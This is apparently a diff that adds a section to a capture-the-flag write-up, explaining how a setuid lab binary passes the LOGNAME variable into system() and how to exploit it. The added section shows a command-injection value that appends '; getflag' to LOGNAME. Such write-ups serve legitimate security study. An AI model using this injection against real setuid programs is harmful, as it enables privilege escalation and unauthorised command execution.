@@ -234,3 +234,15 @@ END
 # get the flag
 cat /tmp/flag
 ```
+
+## Carefully examine your surroundings (level07)
+
+As usual, we have a setuid binary in the home. This one calls the system
+function by directly passing it the contents of the `LOGNAME` env variable
+through an asprintf call with the following format: `/bin/echo %s`.
+This means we just have to do that to get the flag:
+
+```shell
+# end the echo command, add a ';' separator and call getflag
+env LOGNAME='lol im gonna pown you ez; getflag' ./level07
+```
